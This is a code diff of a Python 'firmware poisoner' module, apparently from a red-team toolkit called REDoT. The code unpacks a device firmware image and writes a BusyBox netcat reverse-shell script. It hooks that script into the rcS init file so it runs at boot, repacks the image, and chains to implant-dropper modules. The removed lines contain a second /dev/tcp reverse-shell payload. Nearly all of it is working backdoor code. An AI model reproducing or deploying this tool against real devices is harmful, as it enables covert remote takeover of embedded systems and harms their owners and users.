@@ -2,19 +2,28 @@
 # modules/firmware/firmware_poisoner.py
 
 import os
-import shutil
-import socket
+import argparse
 import subprocess
+import shutil
 from datetime import datetime
+import socket
 import json
 
-FIRMWARE_INPUT = "firmware/image.bin"
-UNPACKED_DIR = "firmware/unpacked"
-MODIFIED_FIRMWARE = "firmware/firmware_poisoned.bin"
-REPORT_LOG = "reports/firmware_poison_log.json"
-INIT_SCRIPT = "etc/init.d/rcS"
-REVERSE_PORT = 4444
+FIRMWARE_DIR = "firmware"
+REPORTS_DIR = "reports"
+DEFAULT_FIRMWARE = os.path.join(FIRMWARE_DIR, "image.bin")
+MOD_DIR = os.path.join(FIRMWARE_DIR, "mod")
+OUTPUT_IMAGE = os.path.join(FIRMWARE_DIR, "image_poisoned.bin")
+KILLCHAIN_LOG = os.path.join(REPORTS_DIR, "killchain.json")
+AUTO_PAYLOAD_NAME = "init_reverse.sh"
 
+def ensure_environment():
+    os.makedirs(FIRMWARE_DIR, exist_ok=True)
+    os.makedirs(REPORTS_DIR, exist_ok=True)
+    if not os.path.exists(DEFAULT_FIRMWARE):
+        with open(DEFAULT_FIRMWARE, "wb") as f:
+            f.write(b'\x00' * 1024)
+        print(f"[!] Placeholder firmware created at {DEFAULT_FIRMWARE} (replace with real image)")
 
 def get_local_ip():
     try:
@@ -26,89 +35,96 @@ def get_local_ip():
     except:
         return "127.0.0.1"
 
+def generate_payload(lhost, lport):
+    payload = f"""#!/bin/sh
+/bin/busybox nc {lhost} {lport} -e /bin/sh
+"""
+    path = os.path.join(MOD_DIR, AUTO_PAYLOAD_NAME)
+    with open(path, "w") as f:
+        f.write(payload)
+    os.chmod(path, 0o755)
+    return path
 
-def generate_reverse_shell(ip, port=REVERSE_PORT):
-    return f"\n\n# REDoT Payload Injected\n/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1\n"
-
-
-def unpack_firmware():
+def unpack_firmware(firmware_path):
     print("[*] Unpacking firmware...")
-    os.makedirs(UNPACKED_DIR, exist_ok=True)
-    result = subprocess.run(["binwalk", "-e", FIRMWARE_INPUT], capture_output=True, text=True)
-    if "Extracted" not in result.stdout:
-        raise RuntimeError("Binwalk failed to extract firmware.")
-    for root, dirs, files in os.walk("firmware/_image.bin.extracted"):
-        if INIT_SCRIPT in [os.path.relpath(os.path.join(root, f), "firmware/_image.bin.extracted") for f in files]:
-            return os.path.join(root, INIT_SCRIPT)
-    raise FileNotFoundError("Could not find init script in unpacked image.")
+    shutil.rmtree(MOD_DIR, ignore_errors=True)
+    os.makedirs(MOD_DIR, exist_ok=True)
+    subprocess.run(["binwalk", "-e", firmware_path], check=True)
+    for root, dirs, _ in os.walk(FIRMWARE_DIR):
+        for d in dirs:
+            if "squashfs-root" in d:
+                squash_path = os.path.join(root, d)
+                shutil.copytree(squash_path, MOD_DIR, dirs_exist_ok=True)
+                return
+    raise Exception("SquashFS root not found")
 
-
-def inject_payload(init_path, ip):
-    print("[*] Injecting payload into init script...")
-    with open(init_path, "a") as f:
-        f.write(generate_reverse_shell(ip))
-
+def inject_payload(payload_path):
+    print("[*] Injecting payload into init scripts...")
+    init_script = os.path.join(MOD_DIR, "etc", "init.d", "rcS")
+    if not os.path.exists(init_script):
+        raise Exception("rcS init script not found")
+    with open(init_script, "a") as f:
+        f.write(f"\n/bin/sh /etc/init.d/{AUTO_PAYLOAD_NAME} &\n")
+    shutil.copy(payload_path, os.path.join(MOD_DIR, "etc", "init.d"))
 
 def repack_firmware():
-    print("[*] Repacking firmware image...")
-    squashfs_root = os.path.dirname(os.path.abspath(unpack_firmware()))
-    subprocess.run(["mksquashfs", squashfs_root, MODIFIED_FIRMWARE, "-noappend", "-comp", "gzip"], check=True)
+    print("[*] Repacking firmware...")
+    squash_path = os.path.join(FIRMWARE_DIR, "squashfs.img")
+    subprocess.run(["mksquashfs", MOD_DIR, squash_path, "-noappend", "-comp", "gzip"], check=True)
+    shutil.copy(squash_path, OUTPUT_IMAGE)
+    print(f"[+] Poisoned firmware image created: {OUTPUT_IMAGE}")
 
-
-def chain_uart_extractor():
-    print("[*] Launching UART extraction...")
-    subprocess.run(["python3", "modules/hardware/uart_extractor.py", "--input", MODIFIED_FIRMWARE])
-
-
-def drop_implant():
-    print("[*] Deploying implant via implant_dropper...")
-    subprocess.run(["python3", "modules/payloads/implant_dropper.py", "--source", MODIFIED_FIRMWARE])
-
-
-def push_to_dashboard(info):
-    try:
-        import requests
-        requests.post("http://localhost:5000/api/firmware_alert", json=info, timeout=3)
-    except:
-        print("[!] Could not push to dashboard server.")
-
-
-def log_report(payload_ip):
-    os.makedirs("reports", exist_ok=True)
-    report = {
-        "timestamp": datetime.now().isoformat(),
-        "original_image": FIRMWARE_INPUT,
-        "modified_image": MODIFIED_FIRMWARE,
-        "payload_ip": payload_ip,
-        "reverse_port": REVERSE_PORT,
-        "modules_chained": ["uart_extractor.py", "implant_dropper.py"]
+def log_killchain_entry(cve_id="N/A"):
+    now = datetime.now().isoformat()
+    entry = {
+        "step": "5. Installation",
+        "timestamp": now,
+        "module": "firmware_poisoner",
+        "description": "Payload injected into firmware image",
+        "cve": cve_id
     }
-    with open(REPORT_LOG, "w") as f:
-        json.dump(report, f, indent=2)
-    return report
 
+    if os.path.exists(KILLCHAIN_LOG):
+        with open(KILLCHAIN_LOG, "r") as f:
+            data = json.load(f)
+    else:
+        data = []
 
-def check_permissions():
-    for d in ["firmware", "reports"]:
-        if not os.access(d, os.W_OK):
-            raise PermissionError(f"Directory '{d}' is not writable.")
+    data.append(entry)
+    with open(KILLCHAIN_LOG, "w") as f:
+        json.dump(data, f, indent=2)
+    print(f"[+] Kill chain log updated: {KILLCHAIN_LOG}")
 
+def chain_followup_modules():
+    print("[*] Triggering follow-up modules...")
+    os.system("python3 modules/firmware/uart_extractor.py")
+    os.system("python3 modules/payloads/implant_dropper.py --target-device poisoned_firmware")
+    print("[+] Follow-up modules executed.")
 
 def main():
-    print("=== REDoT Firmware Poisoner ===")
-    check_permissions()
-    attacker_ip = get_local_ip()
-    print(f"[+] Detected local IP: {attacker_ip}")
+    parser = argparse.ArgumentParser(description="REDoT Firmware Poisoner")
+    parser.add_argument("--firmware", help="Firmware image to poison", default=DEFAULT_FIRMWARE)
+    parser.add_argument("--lport", type=int, default=4444, help="Reverse shell port")
+    parser.add_argument("--no-chain", action="store_true", help="Disable chaining to next modules")
+    args = parser.parse_args()
 
-    init_path = unpack_firmware()
-    inject_payload(init_path, attacker_ip)
+    ensure_environment()
+
+    if not os.path.exists(args.firmware):
+        print(f"[!] Firmware not found: {args.firmware}")
+        return
+
+    lhost = get_local_ip()
+    print(f"[*] Using LHOST: {lhost}")
+
+    payload = generate_payload(lhost, args.lport)
+    unpack_firmware(args.firmware)
+    inject_payload(payload)
     repack_firmware()
-    chain_uart_extractor()
-    drop_implant()
-    report = log_report(attacker_ip)
-    push_to_dashboard(report)
-    print("[+] Firmware poisoning complete. Image ready at:", MODIFIED_FIRMWARE)
+    log_killchain_entry(cve_id="Custom-Payload")
 
+    if not args.no_chain:
+        chain_followup_modules()
 
 if __name__ == "__main__":
     main()
